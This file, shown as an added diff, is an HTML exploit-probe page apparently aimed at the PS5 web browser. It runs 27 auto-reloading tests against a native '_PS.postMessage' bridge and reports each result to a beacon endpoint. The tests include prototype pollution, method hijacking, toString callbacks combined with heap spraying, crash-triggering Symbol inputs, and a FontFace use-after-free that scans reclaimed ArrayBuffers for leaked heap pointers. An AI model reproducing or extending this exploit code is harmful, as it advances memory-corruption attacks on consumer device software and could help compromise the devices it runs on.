@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+// Fresh key — P844v1 is stuck at test 5
+var KEY='p844v2_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);localStorage.removeItem('p844_test');}catch(e){}}
+
+var testNum=getTest();
+log('P844v2 BOOT test='+testNum);
+bn('P844v2-BOOT','test='+testNum);
+
+var TESTS=[
+  // === GROUP A: SAFE OPS FIRST (skip format strings — confirmed dead) ===
+
+  // T0: setPrototypeOf
+  function T0(){
+    var origProto=Object.getPrototypeOf(_PS);
+    var fake={__secret:42};
+    var r1,r2,r3;
+    try{
+      r1=Object.setPrototypeOf(_PS,fake);
+      r2=_PS.__secret;
+      Object.setPrototypeOf(_PS,origProto);
+    }catch(e){r3=e.message;}
+    return 'setProto='+(r1===_PS)+'|secret='+r2+'|err='+r3;
+  },
+  // T1: defineProperty
+  function T1(){
+    var r1,r2,r3;
+    try{
+      Object.defineProperty(_PS,'postMessage',{value:function(){return 'hijacked';}});
+      r1=_PS.postMessage('test');
+    }catch(e){r2=e.message;}
+    try{
+      Object.defineProperty(_PS,'leak',{value:0x41414141,writable:true,enumerable:true,configurable:true});
+      r3=_PS.leak;
+    }catch(e){r3='err:'+e.message;}
+    return 'hijack='+r1+'|err='+r2+'|leak='+r3;
+  },
+  // T2: prototype pollution
+  function T2(){
+    var r=[];
+    try{_PS.__proto__.injected='pwn';r.push('protoSet='+_PS.__proto__.injected);}catch(e){r.push('protoSetErr:'+e.message);}
+    try{_PS.injected2='direct';r.push('direct='+_PS.injected2);}catch(e){r.push('directErr:'+e.message);}
+    var d1=Object.getOwnPropertyDescriptor(_PS,'postMessage');
+    r.push('pm_conf='+((d1&&d1.configurable)||false));
+    r.push('pm_writ='+((d1&&d1.writable)||false));
+    try{var dd=delete _PS.postMessage;r.push('del='+dd+'|pm='+(typeof _PS.postMessage));}catch(e){r.push('delErr:'+e.message);}
+    return r.join('|');
+  },
+  // T3: toString basic
+  function T3(){
+    var called=false;
+    var obj={toString:function(){called=true;return 'hello';}};
+    var r=_PS.postMessage(obj);
+    return 'called='+called+'|ret='+r;
+  },
+  // T4: toString with GC spray
+  function T4(){
+    var called=false;
+    var bufs=[];
+    var obj={toString:function(){
+      called=true;
+      for(var i=0;i<200;i++)bufs.push(new ArrayBuffer(192));
+      for(var i=0;i<50;i++){var a=new Array(1000);a=null;}
+      return 'gc-spray-done';
+    }};
+    var r=_PS.postMessage(obj);
+    return 'called='+called+'|ret='+r+'|bufs='+bufs.length;
+  },
+  // T5: toString with takeHeapSnapshot
+  function T5(){
+    var called=false;
+    var snapResult='none';
+    var obj={toString:function(){
+      called=true;
+      try{snapResult=String(console.takeHeapSnapshot());}catch(e){snapResult='err:'+e.message;}
+      return 'snap-done';
+    }};
+    var r=_PS.postMessage(obj);
+    return 'called='+called+'|snap='+snapResult+'|ret='+r;
+  },
+  // T6: toString recursive
+  function T6(){
+    var depth=0;
+    var obj={toString:function(){
+      depth++;
+      if(depth<5){try{_PS.postMessage(obj);}catch(e){}}
+      return 'depth-'+depth;
+    }};
+    var r=_PS.postMessage(obj);
+    return 'maxDepth='+depth+'|ret='+r;
+  },
+  // T7: toString delete _PS
+  function T7(){
+    var saved=window._PS;
+    var called=false;
+    var obj={toString:function(){
+      called=true;
+      try{delete window._PS;}catch(e){}
+      try{window._PS=undefined;}catch(e){}
+      return 'deleted';
+    }};
+    var r;
+    try{r=saved.postMessage(obj);}catch(e){r='err:'+e.message;}
+    try{window._PS=saved;}catch(e){}
+    return 'called='+called+'|ret='+r+'|restored='+(typeof window._PS);
+  },
+  // T8: valueOf
+  function T8(){
+    var called=false;
+    var obj={valueOf:function(){called=true;return 0xDEADBEEF;},toString:function(){return 'fallback';}};
+    var r=_PS.postMessage(obj);
+    return 'called='+called+'|ret='+r;
+  },
+  // T9: Symbol.toPrimitive
+  function T9(){
+    var hints=[];
+    var obj={};
+    obj[Symbol.toPrimitive]=function(hint){hints.push(hint);return 'tp-'+hint;};
+    var r=_PS.postMessage(obj);
+    return 'hints='+hints.join(',')+'|ret='+r;
+  },
+  // T10: toString stack trace leak
+  function T10(){
+    var stack='none';
+    var obj={toString:function(){
+      try{throw new Error('probe');}catch(e){stack=e.stack||'empty';}
+      return 'stack-captured';
+    }};
+    var r=_PS.postMessage(obj);
+    var addrs=(stack.match(/0x[0-9a-f]+/gi)||[]);
+    return 'stack='+stack.substring(0,300)+'|addrs='+addrs.join(',')+'|ret='+r;
+  },
+  // T11: construct
+  function T11(){
+    var r;
+    try{r=new _PS.postMessage('construct-test');}catch(e){r='err:'+e.message;}
+    return 'construct='+r;
+  },
+  // T12: 1MB string
+  function T12(){
+    var s='';for(var i=0;i<20;i++)s+=s||'A'.repeat(1024);
+    var r;
+    try{r=_PS.postMessage(s);}catch(e){r='err:'+e.message;}
+    return 'len='+s.length+'|ret='+r;
+  },
+  // T13: wrong this
+  function T13(){
+    var pm=_PS.postMessage;
+    var r1,r2,r3;
+    try{r1=pm.call(null,'null-this');}catch(e){r1='err:'+e.message;}
+    try{r2=pm.call({},'obj-this');}catch(e){r2='err:'+e.message;}
+    try{r3=pm.call(window,'win-this');}catch(e){r3='err:'+e.message;}
+    return 'null='+r1+'|obj='+r2+'|win='+r3;
+  },
+  // T14: getOwnPropertyNames deep
+  function T14(){
+    var r=[];
+    try{r.push('own:'+Object.getOwnPropertyNames(_PS).join(','));}catch(e){r.push('ownErr:'+e.message);}
+    try{r.push('keys:'+Object.keys(_PS).join(','));}catch(e){r.push('keysErr:'+e.message);}
+    try{
+      var syms=Object.getOwnPropertySymbols(_PS);
+      r.push('syms:'+syms.length);
+      for(var i=0;i<syms.length;i++)r.push('sym:'+String(syms[i]));
+    }catch(e){r.push('symErr:'+e.message);}
+    var d=Object.getOwnPropertyDescriptor(_PS,'postMessage');
+    if(d){
+      r.push('desc:v='+typeof d.value+'|w='+d.writable+'|e='+d.enumerable+'|c='+d.configurable);
+      if(d.get)r.push('getter='+typeof d.get);
+      if(d.set)r.push('setter='+typeof d.set);
+    }
+    return r.join('|');
+  },
+  // T15: Reflect ops
+  function T15(){
+    var r=[];
+    try{r.push('isExt='+Reflect.isExtensible(_PS));}catch(e){r.push('isExtErr:'+e.message);}
+    try{r.push('prevExt='+Reflect.preventExtensions(_PS));}catch(e){r.push('prevExtErr:'+e.message);}
+    try{r.push('isExt2='+Reflect.isExtensible(_PS));}catch(e){r.push('isExt2Err:'+e.message);}
+    try{r.push('has_pm='+Reflect.has(_PS,'postMessage'));}catch(e){r.push('hasErr:'+e.message);}
+    try{r.push('proto='+String(Reflect.getPrototypeOf(_PS)));}catch(e){r.push('protoErr:'+e.message);}
+    try{Object.freeze(_PS);r.push('frozen='+Object.isFrozen(_PS));}catch(e){r.push('freezeErr:'+e.message);}
+    return r.join('|');
+  },
+  // T16: toString with FontFace UAF (CRITICAL — can we leak heap during conversion?)
+  function T16(){
+    var H='none';
+    var fabs=[];
+    var obj={toString:function(){
+      // Run FontFace UAF INSIDE toString callback
+      try{
+        var st=document.createElement('style');
+        st.textContent="@font-face{font-family:uu1;src:local(Arial);unicode-range:U+0042;}";
+        document.head.appendChild(st);
+        var face=new FontFace('uf1',"local('Helvetica')",{unicodeRange:'U+0041'});
+        document.fonts.add(face);
+        void face.loaded;
+        var ffired=false;
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(ffired)return undefined;
+            ffired=true;
+            st.remove();st.textContent='';st=null;
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs=[];
+            for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+            try{document.fonts.check('1em uu1');}catch(e){}
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}
+        });
+        document.fonts.load('1em uf1, uu1','AB');
+        // Check reclaim
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){
+            if(bv[j]!==0n){
+              var hi=Number(bv[j]>>32n);
+              if(hi>0x100&&hi<0x7FFF){H='0x'+bv[j].toString(16);break;}
+            }
+          }
+          if(H!=='none')break;
+        }
+      }catch(e){H='err:'+e.message;}
+      return 'uaf-H='+H;
+    }};
+    var r=_PS.postMessage(obj);
+    return 'H='+H+'|ret='+r+'|bufs='+fabs.length;
+  },
+  // T17: postMessageNative vs _PS.postMessage
+  function T17(){
+    var r=[];
+    try{r.push('pmn='+typeof postMessageNative);}catch(e){r.push('pmn=undef');}
+    try{
+      var r1=postMessageNative('test-native');
+      r.push('native_ret='+r1);
+    }catch(e){r.push('native_err='+e.message);}
+    // Are they the same function?
+    try{r.push('same='+(postMessageNative===_PS.postMessage));}catch(e){r.push('sameErr='+e.message);}
+    // Can we replace postMessageNative?
+    try{
+      var orig=postMessageNative;
+      postMessageNative=function(d){return 'intercepted:'+d;};
+      var r2=postMessageNative('test-replace');
+      r.push('replaced='+r2);
+      // Does _PS still work after replacing postMessageNative?
+      var r3=_PS.postMessage('after-replace');
+      r.push('ps_after='+r3);
+      postMessageNative=orig;
+    }catch(e){r.push('replaceErr='+e.message);}
+    return r.join('|');
+  },
+  // T18: _PS.postMessage.bind / apply / call
+  function T18(){
+    var r=[];
+    var pm=_PS.postMessage;
+    try{
+      var bound=pm.bind(_PS);
+      r.push('bind_type='+typeof bound);
+      var r1=bound('bind-test');
+      r.push('bind_ret='+r1);
+    }catch(e){r.push('bindErr='+e.message);}
+    try{
+      var r2=pm.apply(_PS,['apply-test']);
+      r.push('apply_ret='+r2);
+    }catch(e){r.push('applyErr='+e.message);}
+    try{
+      var r3=Function.prototype.call.call(pm,_PS,'fpcall-test');
+      r.push('fpcall_ret='+r3);
+    }catch(e){r.push('fpcallErr='+e.message);}
+    return r.join('|');
+  },
+  // T19: _PS.postMessage with numeric / boolean / array / nested object
+  function T19(){
+    var r=[];
+    try{r.push('num='+_PS.postMessage(42));}catch(e){r.push('numErr='+e.message);}
+    try{r.push('bool='+_PS.postMessage(true));}catch(e){r.push('boolErr='+e.message);}
+    try{r.push('arr='+_PS.postMessage([1,2,3]));}catch(e){r.push('arrErr='+e.message);}
+    try{r.push('nested='+_PS.postMessage({a:{b:{c:'deep'}}}));}catch(e){r.push('nestedErr='+e.message);}
+    try{r.push('null='+_PS.postMessage(null));}catch(e){r.push('nullErr='+e.message);}
+    try{r.push('undef='+_PS.postMessage(undefined));}catch(e){r.push('undefErr='+e.message);}
+    try{r.push('nan='+_PS.postMessage(NaN));}catch(e){r.push('nanErr='+e.message);}
+    try{r.push('inf='+_PS.postMessage(Infinity));}catch(e){r.push('infErr='+e.message);}
+    return r.join('|');
+  },
+
+  // === GROUP B: CRASH TESTS (run last, may crash-loop) ===
+
+  // T20: Proxy — just create (no call)
+  function T20(){
+    var p=new Proxy(_PS,{});
+    return 'created='+typeof p+'|str='+String(p);
+  },
+  // T21: Proxy — get trap only (no call)
+  function T21(){
+    var got=[];
+    var p=new Proxy(_PS,{get:function(t,prop){got.push(prop);return Reflect.get(t,prop);}});
+    var pm=p.postMessage;
+    return 'got='+got.join(',')+'|pm='+typeof pm;
+  },
+  // T22: Proxy — call postMessage through proxy
+  function T22(){
+    var got=[];
+    var p=new Proxy(_PS,{get:function(t,prop){got.push('get:'+prop);return Reflect.get(t,prop);}});
+    try{p.postMessage('proxy-call');}catch(e){got.push('err:'+e.message);}
+    return got.join('|');
+  },
+  // T23: Proxy on postMessage function itself
+  function T23(){
+    var got=[];
+    var origPM=_PS.postMessage;
+    var pFn=new Proxy(origPM,{apply:function(t,th,a){got.push('apply:'+a[0]);return Reflect.apply(t,th,a);}});
+    try{pFn.call(_PS,'proxy-fn');}catch(e){got.push('err:'+e.message);}
+    return got.join('|');
+  },
+  // T24: Symbol with toString override
+  function T24(){
+    var origTS=Symbol.prototype.toString;
+    var called=false;
+    Symbol.prototype.toString=function(){called=true;return 'safe-string';};
+    var r;
+    try{r=_PS.postMessage(Symbol('test'));}catch(e){r='err:'+e.message;}
+    Symbol.prototype.toString=origTS;
+    return 'called='+called+'|ret='+r;
+  },
+  // T25: Symbol well-known
+  function T25(){
+    var r;
+    try{r=_PS.postMessage(Symbol.iterator);}catch(e){r='err:'+e.message;}
+    return 'iterator='+r;
+  },
+  // T26: Raw Symbol crash confirm
+  function T26(){
+    var r;
+    try{r=_PS.postMessage(Symbol('crash'));}catch(e){r='err:'+e.message;}
+    return 'ret='+r;
+  }
+];
+
+var NAMES=[
+  'T0-setProto','T1-defineProp','T2-protoPollution','T3-toString','T4-toStringGcSpray',
+  'T5-toStringHeapSnap','T6-toStringRecursive','T7-toStringDeletePS','T8-valueOf','T9-toPrimitive',
+  'T10-toStringStack','T11-construct','T12-hugeString','T13-wrongThis','T14-getOwnPropNames',
+  'T15-reflectOps','T16-toStringUAF','T17-postMessageNative','T18-bindApplyCall','T19-typeVariants',
+  'T20-proxyCreate','T21-proxyGet','T22-proxyCall','T23-proxyFn',
+  'T24-symOverride','T25-symWellknown','T26-symRaw'
+];
+
+function advance(){
+  setTest(testNum+1);
+  location.reload();
+}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL TESTS COMPLETE');
+    bn('P844v2-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v2-'+name+'-PRE','starting');
+
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v2-'+name+'-OK',result);
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v2-'+name+'-ERR',e.message);
+  }
+
+  advance();
+}
+
+setTimeout(runTest,100);
+</script>
+</body>
+</html>
